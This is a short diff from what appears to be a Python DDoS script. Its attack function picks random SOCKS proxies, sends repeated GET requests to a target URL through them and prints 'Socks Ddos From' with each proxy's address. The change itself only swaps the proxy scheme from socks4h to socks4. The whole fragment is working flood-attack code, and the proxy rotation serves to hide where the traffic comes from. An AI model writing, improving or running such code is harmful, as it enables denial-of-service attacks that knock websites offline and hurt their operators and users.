@@ -55,8 +55,8 @@ def atk():
 		proxy = random.choice(pprr).strip().split(":")
 		s = requests.session()
 		s.proxies = {}
-		s.proxies['http'] = ("socks4h://"+str(proxy[0])+":"+str(proxy[1]))
-		s.proxies['https'] = ("socks4h://"+str(proxy[0])+":"+str(proxy[1]))
+		s.proxies['http'] = ("socks4://"+str(proxy[0])+":"+str(proxy[1]))
+		s.proxies['https'] = ("socks4://"+str(proxy[0])+":"+str(proxy[1]))
 		try:
 			s.get(url)
 			print(Fore.BLUE + "Socks Ddos From ~ / " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]))
